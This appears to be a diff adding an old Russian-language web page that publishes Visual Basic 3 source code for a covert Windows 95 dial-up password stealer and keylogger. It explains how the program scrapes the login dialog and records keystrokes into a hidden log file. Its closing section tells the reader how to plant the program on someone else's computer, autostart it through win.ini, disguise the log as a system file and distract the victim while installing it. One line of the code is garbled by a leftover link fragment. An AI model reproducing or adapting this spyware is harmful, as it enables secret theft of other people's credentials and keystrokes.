@@ -1,0 +1,389 @@
+<HTML>
+
+<HEAD>
+<TITLE>Съемщик паролей входа в Инет</TITLE>
+</HEAD>
+
+<BODY BACKGROUND="" BGCOLOR="#ffffff" TEXT="#000000" LINK="#0000ff" VLINK="#800080" ALINK="#ff0000">
+<font face="Times New Roman">
+<CENTER><FONT COLOR=ff0000 SIZE="7"><B>BEPCTAK</B></FONT><BR>
+<b><FONT COLOR=#0000ff SIZE="+1">Съемщик паролей входа в Инет</FONT></b><BR></CENTER>
+<CENTER>(C) Master A. Pixel (SLY FOX)</CENTER><BR>
+
+<TABLE BGCOLOR="#ffaa55" WIDTH=40%><TR><TD>&nbsp;Съемщик паролей входа в Инет</TD></TR></TABLE>
+<OL>
+<LI><a href="#1203_1">АЛГОРИТМ</a> <I> ну, так сказать, у целом</I>
+<LI><a href="#1203_2">ОБРАЗЧИК</a> <I> проги для VB3 с комментариями</I>
+</OL>
+<TABLE BGCOLOR="#55aaff" WIDTH=40%><TR><TD>&nbsp;Прочее</TD></TR></TABLE>
+<OL>
+<LI><a href="#1203_3">РЕКОМЕНДАЦИИ</a> <I> по компоновке и использованию</I><P>
+</OL>
+<HR>
+<A NAME="1203_1"></A>
+<TABLE BGCOLOR="#c0c0c0" WIDTH=40%><TR><TD>&nbsp;<FONT COLOR=#ffffff> 1. Алгоритм в целом</FONT></TD></TR></TABLE>
+Вот, кажется, полезный "вирус", который может принести выгоду не только антивирусникам, но его создателю :-)
+Работа программы происходит так:<BR>
+При инициализации создается окно и к нему привязываются два таймера, с тиками 2 раза
+в секунду и 100 раз/сек. Первый таймер предназначен для отслеживания попыток установки связи
+с Инетом (фактичеки связь может и не быть установлена); второй - для грабления нажатий клавиш.
+Недостаточно обрабатывать месседж WM_KEYDOWN, поэтому по второму таймеру отслеживаются
+все нажатия клавиш (или напишите свой драйвер клавиатуры :).
+Первый таймер всегда включен, второй включается только при обнаружении окна терминала (если
+способ входа предусматривает это).
+Когда юзер нажимает ОК в диалоге ввода имени/пароля, появляется окно "Установка связи с...",
+а диалог с экрана пропадает. Выясняется, что этот диалог по какой-то причине не выгружается из памяти,
+а просто прячется (невидимо происходят и другие итнересные вещи). Таким образом, появление окна
+"Установка связи с..." является сигналом к снятию содержимого парольного диалога. Параллельно начинает
+отслеживаеться появление окна терминала, и если оно есть, включается второй таймер, снимающий
+весь клавиатурный ввод. По пропадании терминала накопленное выгружается на диск, второй тайиер выключается. 
+<P>
+<A NAME="1203_2"></A>
+<TABLE BGCOLOR="#c0c0c0" WIDTH=40%><TR><TD>&nbsp;<FONT COLOR=#ffffff> 2. Образчик проги для VB3</FONT></TD></TR></TABLE>
+&nbsp;&nbsp;Для образчика выбран общепонятный язык басик. Специфические места прокомментированы
+для облегчения понимания и написания на других компиляторах. Тем не менее код полностью рабочий. Тем
+удобнее встроить его, скажем, в макросы или OLE-объекты, в чем басик вполне мастак. Сорри, код не совсем причесан
+и не оптимизирован, просто не ставилась такая цель. Интересующиеся, ИМХО, сделают это согласно условиям его применения.
+<PRE>
+// Инф. для справки:
+// типы данных басика:
+// string  или $   =   char[] (для вызовов API преобразуется в lpsz) 
+// integer или %   =   int (signed).
+// ByVal означет, что аргумент передается в стек по значению, по-Паскалевски (вызовы API)
+// опущенное ByVal означет передачу аргумента по ссылке.
+// знак <> означет "не равно".
+<HR> 
+// Здесь создается внутренняя структура описания окна просто для удобства.
+Type Window
+    hwnd    As Integer
+    name    As String
+End Type
+
+// Массиив для кодов клавиш
+Global key(255) As Integer
+
+Dim UserName    As String
+Dim PassWrd     As String
+Dim DialNum     As String
+Dim Wnd(255)    As Window
+Dim Child(255)  As Window
+Dim Shift       As Integer	// Флажок нажатия Shift
+
+Global TermChar As String	
+Global TermBox  As String
+
+// Объявления вызовов API
+Declare Function GetWindow% Lib "user" (ByVal hwindow%, ByVal wCmd%)
+Declare Function GetWindowText% Lib "user" (ByVal hwindow%, ByVal lpSting$, ByVal nMaxCount%)
+Declare Function GetWindowTextLength% Lib "user" (ByVal hwindow%)
+Declare Function SendMessage% Lib "user" (ByVal hwnd%, ByVal message%, ByVal wParam%, ByVal lParam$)
+Declare Function GetAsyncKeyState% Lib "user" (ByVal X As Integer)
+
+Const GW_CHILD = 5
+Const GW_HWNDFIRST = 0
+Const GW_HWNDLAST = 1
+Const GW_HWNDNEXT = 2
+Const GW_HWNDPREV = 3
+Const GW_OWNER = 4
+
+// Месседж, посылаемый окну для получения его содержимого
+Const WM_GETTEXT = &HD     // = 0x0D
+<HR>// *********************************************************
+// *	            Точка входа                         *
+// *********************************************************
+Sub Main ()
+    Load SpyWindow // для отслеживания списка окон создаем стартовое окно...
+    SpyWindow.Hide // ...и прячем его.
+
+    // к созданному окну привязано два таймера, Т1 и Т2, с тиками 2 раза/сек и 100 раз/сек.
+    // инициализация такова, что Т1 разрешен, Т2 выключен;
+    // с приходом месседжа от Т1 вызывается обработка void TimerProc1(void)
+    // с приходом месседжа от Т2 вызывается обработка void TimerProc2(void)
+End Sub
+<HR>// ***********************************************************
+// * основная процедура, вызывается 2 раза/сек от таймера Т1 *
+// ***********************************************************
+Sub TimerProc1 ()
+Dim newUserName    As String
+Dim newPassWrd     As String
+Dim newDialNum     As String
+Dim TermhWnd       As Integer
+Dim i              As Integer
+Dim j              As Integer
+
+    <A HREF="#LoadWnds">LoadWnds</A>	// загружаем список всех окон
+    If <A HREF="#FindWindow">FindWindow</A>("Терминала (после подключения)") <> 0 Then
+	// Найдено окно терминальты
+        If SpyWindow.Timer2.Interval = 0 Then
+	    //если второй таймер был выключен, то чистим буфер клавиатуры и включаем его
+            For i = 0 To 255: j = GetAsyncKeyState(i): Next i
+            SpyWindow.Timer2.Interval = 20
+        End If
+    Else    //Онко терминала не найдено...
+        If SpyWindow.Timer2.Interval <>0  Then 
+	    //...но было ранее, а теперь пропало.
+            <A HREF="#SaveTermInfo">SaveTermInfo</A> TermChar, TermBox
+            TermChar = ""
+            SpyWindow.Timer2.Interval = 0 //выключаем таймер 2
+        End If
+    End If
+    // Проверяем попытку установить связь
+    // Используется тот факт, что, когда появляется окно "Установка связи с", то
+    // первый диалог (где юзер набирает пароль) просто прячется, но не
+    // выгружается. Спасибо Вилли Гейтсу :=)
+    If <A HREF="#FindNearWindow">FindNearWindow</A>("Установлена связь с") <> 0 Then
+	// грузим список дочерних окон этого окна:
+        <A HREF="#LoadChilds">LoadChilds</A> (FindWindow("Установка связи"))
+	// сбой - дочернее окно почему-то не найдено (???)
+        If <A HREF="#FindChild">FindChild</A>("Имя пользователя") = 0 Then Exit Sub
+	// грабим содержимое следующих за именованными дочерних окошек:
+        newUserName = <A HREF="#Capture">Capture</A>(FindChild("Имя пользователя") + 1)
+        newPassWrd = Capture(FindChild("Пароль") + 1)
+        newDialNum = Capture(FindChild("Телефон") + 1)
+	// сверяем с ранее сграбленными
+        If UserName = newUserName And PassWrd = newPassWrd And DialNum = newDialNum Then Exit Sub
+	// хотя бы одно значение отличается!
+        UserName = newUserName
+        PassWrd = newPassWrd
+        DialNum = newDialNum
+        <A HREF="#SaveDialogInfo">SaveDialogInfo</A> (UserName, PassWrd, DialNum)
+    End If
+End Sub
+<HR><A NAME="Capture"></A>
+Function Capture (childIDX As Integer) As String
+// аргумент - индекс в массиве загруженных дочерних окон
+// посылает окну сообщение WM_GETTEXT и получает его содержимое
+// возвращает его (в виде строки)
+Dim rc As Integer
+Dim wParam As Integer
+Dim lParam As String
+    wParam = 1024	// макс. длина содержимого
+    lParam = Space(1024) // lparam содержит строку пробелов длиной 1024 символа
+    rc = SendMessage(Child(childIDX).hchild, WM_GETTEXT, wParam, lParam)
+    If rc <> 0 Then lParam = Left(lParam, rc) // обрезка строки по фактической длине
+    Capture = lParam
+End Function
+<HR><A NAME="FindChild"></A>
+Function FindChild (childName As String) As Integer
+// аргумент - строка, содерж. имя дочернего окна
+// возвращает индекс массива загруженных процедурой LoadChilds доч. окон
+Dim i As Integer
+FindChild = 0
+For i = 0 To 255
+    If InStr(Child(i).name, childName) <> 0 Then
+	// встроенная ф-ция Insr ищет подстроку в строке
+        // возвращает позицию вхождения или 0
+        FindChild = i
+        Exit For
+    End If
+Next i
+End Function
+<HR><A NAME="FindNearWindow"></A>
+Function FindNearWindow (WinName As String) As Integer
+// ищет приблизительно подходящее название окна
+// возвращает индекс в массиве загруженых окон
+Dim i As Integer
+FindNearWindow = 0
+For i = 0 To 255
+    If InStr(Wnd(i).name, WinName) <> 0 Then
+        FindNearWindow = Wnd(i).hwnd
+        Exit For
+    End If
+Next i
+End Function
+<HR><A NAME="FindWindow"></A>
+Function FindWindow (WinName As String) As Integer
+// см. FindNearWindow
+Dim i As Integer
+FindWindow = 0
+For i = 0 To 255
+    If Wnd(i).name = WinName Then
+        FindWindow = Wnd(i).hwnd
+        Exit For
+    End If
+Next i
+End Function
+<HR><A NAME="LoadChilds"></A>
+Sub LoadChilds (hwnd As Integer)
+// загружает в массив Child() список дочерних окошек указанного окна
+// аргумент - hWnd, указывающий окно
+Dim hchild          As Integer
+Dim lpszChildName   As String
+Dim cbChildName     As Integer
+Dim rc              As Integer
+Dim i               As Integer
+    
+    hchild = GetWindow(hwnd, GW_CHILD)	// API ф-ция возвращает hWnd дочернего окна
+    While hchild <> 0
+        cbChildName = GetWindowTextLength(hchild)
+        lpszChildName = Space(127)	// забивает в переменную 127 прбелов
+        rc = GetWindowText(hchild, lpszChildName, cbChildName + 1)
+        If rc <> 0 Then
+            lpszChildName = Left(lpszChildName, rc)  // обрезка строки под реальную длину
+            Child(i).name = lpszChildName
+        End If
+        Child(i).hchild = hchild
+        i = i + 1
+        DoEvents	// дает Windows обработать одно сообщение системной очереди (от задержек)
+        hchild = GetWindow(hchild, GW_HWNDNEXT) // next child
+    Wend
+End Sub
+<HR><A NAME="LoadWnds"></A>
+Sub LoadWnds ()
+// см. LoadChilds
+Dim lpszWinName     As String
+Dim cbWinName       As Integer
+Dim hwnd            As Integer
+Dim created         As Integer
+Dim rc              As Integer
+Dim i               As Integer
+    hwnd = GetWindow(SpyWindow.hWnd, GW_HWNDFIRST)
+    While hwnd <> 0
+        cbWinName = GetWindowTextLength(hwnd)
+        lpszWinName = Space(127)
+        rc = GetWindowText(hwnd, lpszWinName, cbWinName + 1)
+        If rc <> 0 Then
+            lpszWinName = Left(lpszWinName, rc)
+            Wnd(i).name = lpszWinName
+            Wnd(i).hwnd = hwnd
+            i = i + 1
+        End If
+        DoEvents
+        hwnd = GetWindow(hwnd, GW_HWNDNEXT)
+    Wend
+End Sub
+<HR><A NAME="SaveDialogInfo"></A>
+Sub SaveDialogInfo (User As String, PassWrd As String, DialNum As String)
+Dim hFile As Integer
+hFile = FreeFile
+Open "c:\spy.txt" For Append As hFile
+// Append открывает файл и перемещает указатель на конец файла
+    Print #hFile, "Connected " & Date & " - " & Time
+    Print #hFile, "User=" & User & " Pass=" & PassWrd & " Dial=" & DialNum
+Close hFile
+End Sub
+<HR><A NAME="SaveTermInfo"></A>
+Sub SaveTermInfo (TermChar As String, TermBox As String)
+Dim hFile As Integer
+hFile = FreeFile
+Open "c:\spy.txt" For Append As hFile
+    Print #hFile, "Term Box=" & TermBox
+    Print #hFile, "Term Type=" & TermChar
+Close hFile
+End Sub
+<HR>
+Sub TimerProc2 ()
+// процедура обработки второго таймера
+Static ri As Integer
+Static k As Integer
+Static rs As String
+    For k = 0 To 255
+        ri = GetAsyncKeyState(k)
+	// проверка нажатия/отпускания клавиш и устранение повторов
+        If (ri <> 0) And (Not key(k)) Then TermChar = TermChar + <A HREF="#Translate">Translate</A>(k, True)
+        If (ri = 0) And key(k) Then rs = Translate(k, False)
+        key(k) = ri <> 0
+    Next k
+End Sub
+<HR><A NAME="Translate"></A>
+Function Translate (code As Integer, press As Integer) As String
+// простенький транслятор скэн-кодов
+// аргумент press индицирует нажатие Shift'a
+// возвращает строку в коде ASCII
+    If code = 16 Then Shift = press: Exit Function
+    If code = 8 Then Translate = "[BS]": Exit Function
+    If code = 32 Then Translate = " ": Exit Function
+    If code = 13 Then Translate = Chr(13) + Chr(10): Exit Function
+    If code > 64 And code < 91 Then
+        If Shift Then
+            Translate = Chr(code)
+        Else
+            Translate = Chr(code + 32)
+        End If
+        Exit Function
+    End If
+    If code > 47 And code < 58 Then
+        If Shift Then
+            Translate = Choose(code - 47, ")", "!", "@", "#", "$", "%", "^", "&", "*", "(")
+            // Choose выбирает одно из списочных значений от первого аргумента=1
+        Else
+            Translate = Chr(code)
+        End If
+        Exit Function
+    End If
+    If code > 95 And code < 108 Then
+        Translate = Choose(code - 95, "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+")
+        Exit Function
+    End If
+    Select Case Shift
+    Case True
+        Select Case code
+            "Case.class" tppabs="http://www.chat.ru/~sly_fox/Case.class" 192
+                Translate = "~"
+            Case 189
+                Translate = "_"
+            Case 187
+                Translate = "+"
+            Case 220
+                Translate = "|"
+            Case 188
+                Translate = "<"
+            Case 190
+                Translate = ">"
+            Case 191
+                Translate = "?"
+        End Select
+        Exit Function
+    Case False
+        Select Case code
+            Case 192
+                Translate = "'"
+            Case 189
+                Translate = "-"
+            Case 187
+                Translate = "="
+            Case 220
+                Translate = "\"
+            Case 188
+                Translate = ","
+            Case 190
+                Translate = "."
+            Case 191
+                Translate = "/"
+        End Select
+    End Select
+End Function
+</PRE>
+<P>
+<a name="1203_3"></a>
+<TABLE BGCOLOR="#55aaff" WIDTH=40%><TR><TD><FONT COLOR="ffffff">&nbsp;Рекомендации</font></TD></TR></TABLE>
+&nbsp;&nbsp;<B>Компиляция:</B> для получения работающей программы на басике (только вот зачем?)
+создайте форму и поместите на нее два таймера. Инервал первого тайиера 500 мс, второго 0 (запрещен).
+Событие Timer1 будет вызывать TimerProc1, второй соотв.<BR>
+&nbsp;&nbsp;В комментариях я постарался дать информацию по специфике басика для облегчения понимания
+кода и написания на нормальных языках программирования/компиляторах. Данный код не является переносимым
+на другие ОС, так как использует специфичные дыры Win95 (которая, в сущности, одна большая дыра:).<BR>
+&nbsp;&nbsp;<B>Использование:</B> Файл, куда сохраняются грабленные пароли, лучше обозвать типа krnl386.sys, или другим отпугивающим именем :).<BR>
+Использование программы начинается с установки в чужой компьютер. Далее в файле win.ini пропишите
+ее имя в строку load=. Через какое-то время приходите и забирайте пароли с этого компьютера :)))<BR>
+Для быстрого внедрения в чужой компьютер напишите также установщик (возможно, с отложенной распаковкой
+для уменьшения размера копируемого с дискеты файла). Пока жертва отошла покурить (вариант: к телефону,
+на который звонит по вашему сигналу друг), суем дискету и пускаем установщик. Все. В следующий запуск
+Вынь прога распакуется и будет готова к работе.<P>
+&nbsp;&nbsp; Используя эти процедуры как библиотеку, Вы можете строить программы, преследующие другие цели, связанные с незаметным
+отслеживанием ввода/ввывода, как в специфичные окна, так и по системе глобально (что с добавлением отслеживания
+контекста работы пользователя дает иногда оч. интересную информацию). Не представляет также сложности
+разработка ПО, следящего за запуском задач и потоками данных на драйверы устройств (типа принтера или жесткого
+диска). (Что и было сделано). Мой универсальный граббер использует более инетеллектуальный аллгоритм работы,
+позволяя отсеивать "мусор" и сохранять только данные, имеющие наибольшую ценность/интерес. Для этого применены
+разнообразные, как логические, так и эвристические методы анализа информации. Приглашаю к обмену идеями
+в этой области.<BR>
+
+<P>
+<CENTER><a href="1000.html" tppabs="http://www.chat.ru/~sly_fox/1000.html">Назад</a>&nbsp;&nbsp;&nbsp;&nbsp;
+<!--<a href="mailto:sipsik@chat.ru">sipsik@chat.ru</a>-->
+</CENTER>
+</font>
+</BODY>
+
+</HTML>
